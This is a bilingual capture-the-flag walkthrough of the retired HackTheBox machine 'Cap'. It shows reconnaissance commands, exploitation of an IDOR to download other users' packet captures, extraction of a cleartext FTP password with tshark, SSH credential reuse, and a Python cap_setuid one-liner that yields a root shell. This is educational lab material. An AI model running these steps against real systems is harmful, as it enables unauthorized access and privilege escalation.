# Cap [Easy]

> **ES:** Máquina Linux fácil: un panel de seguridad con descargas PCAP predecibles permite robar credenciales y escalar con una capability de Python.
> **EN:** Easy Linux machine: a security dashboard with predictable PCAP downloads leaks credentials, leading to privesc via a Python capability.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Cap] |
| **URL** | https://app.hackthebox.com/machines/Cap |
| **IP lab** | 10.10.10.245 |
| **Fecha de resolución** | 2025-03-19 |

---

## Fuentes / Sources

- [IppSec: Cap (video)](https://youtube.com/watch?v=O_z6o2xuvlw) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía IDOR en descarga PCAP → credenciales FTP/SSH reutilizadas → `cap_setuid` en Python.
> **EN:** Get `user.txt` and `root.txt` via IDOR on PCAP download → reused FTP/SSH credentials → `cap_setuid` on Python.

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap / fscan
- [ ] dirsearch
- [ ] ftp / ssh
- [ ] wireshark / tshark (análisis PCAP)
- [ ] linpeas (`linpeas.sh`)

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Escaneo completo: FTP, SSH y un panel web "Security Dashboard" (Gunicorn) sobre Linux. El panel tiene 3 páginas: `/capture`, `/ip` (ifconfig) y `/netstat`.
> **EN:** Full scan: FTP, SSH and a "Security Dashboard" web panel (Gunicorn) on Linux. The panel has 3 pages: `/capture`, `/ip` (ifconfig) and `/netstat`.

```bash
nmap -vv --min-rate=2000 -A -p- 10.10.10.245
nmap -sC -sV -oN nmap_init 10.10.10.245
```

**Resultado / Result:** 21/tcp vsftpd 3.0.3, 22/tcp OpenSSH 8.2p1 (Ubuntu), 80/tcp Gunicorn "Security Dashboard". OS Linux 4.15–5.19. Capturas del dashboard y huella wappalyzer en `img/` (`img/image_20250331-203119.png`, `img/image_20250335-203556.png`).

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El panel tiene "Security Snapshot (5 Second PCAP + Analysis)" con URL numerada (`/data/2`). Probar otros IDs devuelve capturas ajenas. `dirsearch` no aporta rutas útiles (`/data/*`, `/download/*.csv` redirigen a `/`).
> **EN:** The panel has "Security Snapshot (5 Second PCAP + Analysis)" with a numbered URL (`/data/2`). Trying other IDs returns other users' captures. `dirsearch` adds no useful paths (`/data/*`, `/download/*.csv` redirect to `/`).

```bash
dirsearch -u http://10.10.10.245
curl -s http://10.10.10.245/data/0 -o snap0.pcap
tshark -r snap0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | head
```

**Resultado / Result:** IDOR confirmado: el snapshot `0` contiene tráfico FTP en claro con credenciales válidas `nathan:Buck3tH4TF0RM3!` (credencial de laboratorio retirado). Captura del análisis en `img/image_20250351-205145.png`; captura legacy en `images/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Las credenciales del PCAP funcionan en FTP (donde incluso se lista `user.txt`) y, reutilizadas, también en SSH como `nathan`.
> **EN:** The PCAP credentials work on FTP (where `user.txt` is even listable) and, reused, also over SSH as `nathan`.

```bash
ftp nathan@10.10.10.245
# ftp> ls -lah  -> -r-------- ... user.txt
ssh nathan@10.10.10.245
whoami  # nathan
```

**Resultado / Result:** Shell como `nathan` por SSH (misma contraseña del FTP).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** El home de `nathan` es legible y contiene `user.txt` (visible también por FTP). No se pega el flag completo.
> **EN:** `nathan`'s home is readable and contains `user.txt` (also visible over FTP). Full flag not pasted.

```bash
ls -lah /home/nathan/
cat /home/nathan/user.txt  # formato: 928f... (ofuscado)
```

**Resultado / Result:** `user.txt` leído.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `linpeas` muestra `/usr/bin/python3.8` (destino del enlace `/usr/bin/python3`) con `cap_setuid,cap_net_bind_service+eip`. Con esa capability basta `os.setuid(0)` para ser root. La propia app lo usa: `app.py` ejecuta `python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'` como root para las capturas.
> **EN:** `linpeas` shows `/usr/bin/python3.8` (target of the `/usr/bin/python3` symlink) with `cap_setuid,cap_net_bind_service+eip`. That capability makes `os.setuid(0)` enough to become root. The app itself relies on it: `app.py` runs `python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'` as root for the snapshots.

```bash
ls -l /usr/bin/python3  # -> python3.8
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami  # root
cat /root/root.txt  # formato: e7cc... (ofuscado)
```

**Resultado / Result:** Shell como `root` vía capabilities (sin exploit de kernel ni sudo). Técnica: GTFOBins/capabilities `cap_setuid`.

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** Los IDs predecibles en descargas (IDOR) exponen datos de otros usuarios; el FTP en claro en PCAPs regala credenciales; revisar `getcap` es tan importante como `sudo -l`.
> **EN:** Predictable download IDs (IDOR) expose other users' data; cleartext FTP inside PCAPs gives away credentials; checking `getcap` matters as much as `sudo -l`.

- [ ] IDOR en endpoints numerados (`/data/<id>`)
- [ ] Extracción de credenciales de PCAP (FTP en claro)
- [ ] Reutilización de credenciales FTP → SSH
- [ ] Privesc con Linux capabilities (`cap_setuid` en Python)

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: páginas `/capture|/ip|/netstat`, `app.py` con `os.setuid(0)`, análisis `cap_setuid`) — nota migrada
- **Referencia técnica:** Linux capabilities / `cap_setuid` — https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities — HackTricks (Carlos Polop)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
